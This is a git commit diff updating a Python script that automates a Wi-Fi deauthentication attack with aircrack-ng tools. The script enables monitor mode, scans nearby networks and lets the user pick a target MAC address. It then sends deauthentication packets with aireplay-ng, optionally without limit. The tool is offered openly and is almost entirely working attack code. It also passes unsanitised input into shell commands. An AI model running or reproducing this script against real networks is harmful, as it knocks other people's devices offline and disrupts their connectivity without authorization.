7189123aae746b2c0cc977cffcce29c33c604c50
zacuson <127701558+zacuson@users.noreply.github.com>
2023-05-03 06:16:50 +0000

    Updated deauth script

--- deauthentication_attack_script.py
+++ deauthentication_attack_script.py
@@ -3,19 +3,30 @@
 # Date: 1 May 2023
 
 import os
+import subprocess
+import time
 
 # Ask the user for the necessary information
 interface = input("Enter the wireless interface name (e.g. wlan0): ")
+
+os.system("sudo airmon-ng check kill")
 
 # Start monitoring the wireless network
 os.system("sudo airmon-ng start " + interface)
 
 # Scan for nearby wireless networks
-os.system("sudo airodump-ng " + interface + "mon")
+print("Scanning for nearby wireless networks...")
+os.system("sudo airodump-ng -c 1 -w /home/kali/Downloads/" + interface + " " + interface + "mon")
+"""
+airodump_process = subprocess.Popen(["x-terminal-emulator", "-e", "sudo airodump-ng -w /home/kali/Downloads/" + interface + " " + interface + "mon"])
+"""
+
+# Wait for the user to select the target MAC address
+input("Press Enter when ready to select target MAC address...")
 
 # Display the list of MAC addresses
 mac_addresses = []
-with open(interface + "mon-01.csv", "r") as f:
+with open(interface + "-01.csv", "r") as f:
     lines = f.readlines()
     for line in lines[1:]:
         mac_address = line.split(",")[0].strip()
@@ -24,10 +35,12 @@ with open(interface + "mon-01.csv", "r") as f:
             print(mac_address)
 
 # Ask the user which MAC address to target
-target_mac = input("Enter the MAC address of the target device: ")
-if target_mac not in mac_addresses:
-    print("Invalid MAC address. Please try again.")
-    exit()
+while True:
+    target_mac = input("Enter the MAC address of the target device: ")
+    if target_mac not in mac_addresses:
+        print("Invalid MAC address. Please try again.")
+    else:
+        break
 
 # Ask the user how many deauthentication packets to send
 num_packets = input("Enter the number of deauthentication packets to send (0 for unlimited): ")
@@ -35,5 +48,7 @@ num_packets = input("Enter the number of deauthentication packets to send (0 for
 # Send deauthentication packets to the target device
 os.system("sudo aireplay-ng -0 " + num_packets + " -a " + target_mac + " " + interface + "mon")
 
+"""
 # Stop monitoring the wireless network
 os.system("sudo airmon-ng stop " + interface + "mon")
+"""
